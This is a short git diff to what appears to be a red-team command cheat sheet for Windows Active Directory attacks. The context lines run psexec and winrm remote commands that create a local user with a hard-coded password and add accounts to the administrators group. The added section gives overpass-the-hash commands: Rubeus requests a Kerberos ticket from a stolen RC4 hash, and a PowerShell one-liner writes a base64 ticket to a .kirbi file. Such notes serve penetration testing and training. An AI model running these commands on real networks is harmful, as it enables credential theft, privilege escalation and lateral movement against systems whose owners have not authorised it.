@@ -51,3 +51,9 @@ remote-exec winrm wkstn-4945 whoami; hostname
 remote-exec psexec wkstn-4945 cmd.exe /c "net user rastamouse Passw0rd! /add && net localgroup administrators MeMe /add"
 remote-exec winrm wkstn-4945 net localgroup administrators
 ```
+### Overpass-the-Hash
+```
+execute-assembly C:\tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgt /user:n.lamb /rc4:REDACTED /nowrap
+### Base64 to Ticket 
+[System.IO.File]::WriteAllBytes("C:\Users\Commando\Desktop\Mimikatz_x64\nlamb-tgt.kirbi",[System.Convert]::FromBase64String("doIF[...snip...]Lmlv"))
+```
